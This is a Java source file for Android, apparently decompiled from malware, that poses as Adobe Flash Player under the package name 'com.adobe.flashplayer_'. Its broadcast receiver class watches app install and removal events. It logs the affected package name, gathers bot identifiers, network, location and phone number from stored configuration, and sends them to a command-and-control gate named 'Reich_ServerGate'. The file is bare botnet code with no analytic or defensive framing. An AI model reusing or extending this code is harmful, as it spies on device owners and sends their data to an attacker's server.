package com.adobe.flashplayer_;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Build.VERSION;
import java.io.BufferedReader;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;

public class FlashW extends BroadcastReceiver {
    public void onReceive(Context context, Intent intent) {
        String pkgName = intent.getData().getEncodedSchemeSpecificPart();
        NetworkInfo netInfo = ((ConnectivityManager) context.getSystemService("connectivity")).getActiveNetworkInfo();
        String BotID = readConfig("BotID", context);
        String BotNetwork = readConfig("BotNetwork", context);
        String BotLocation = readConfig("BotLocation", context);
        String URL = readConfig("Reich_ServerGate", context);
        String BotVer = readConfig("BotVer", context);
        String SDK = VERSION.RELEASE;
        writeConfig("package", new StringBuilder(String.valueOf("" + "Action: " + intent.getAction() + "\n")).append("Package: ").append(pkgName).toString(), context);
        if (netInfo != null && netInfo.isConnectedOrConnecting()) {
            new FlashVirtual().execute(new String[]{"&b=" + BotID + "&c=" + BotNetwork.replace(":", "") + "&d=" + BotLocation + "&e=" + readConfig("BotPhone", context) + "&f=" + BotVer + "&g=" + SDK + "&h=package&i=system", context.getFileStreamPath("package").toString(), URL});
        }
    }

    private void writeConfig(String config, String data, Context context) {
        try {
            OutputStreamWriter outputStreamWriter = new OutputStreamWriter(context.openFileOutput(config, 0));
            outputStreamWriter.write(data);
            outputStreamWriter.close();
        } catch (IOException e) {
        }
    }

    private String readConfig(String config, Context context) {
        String ret = "";
        try {
            InputStream inputStream = context.openFileInput(config);
            if (inputStream == null) {
                return ret;
            }
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
            String receiveString = "";
            StringBuilder stringBuilder = new StringBuilder();
            while (true) {
                receiveString = bufferedReader.readLine();
                if (receiveString == null) {
                    inputStream.close();
                    return stringBuilder.toString();
                }
                stringBuilder.append(receiveString);
            }
        } catch (FileNotFoundException | IOException e) {
            return ret;
        }
    }
}
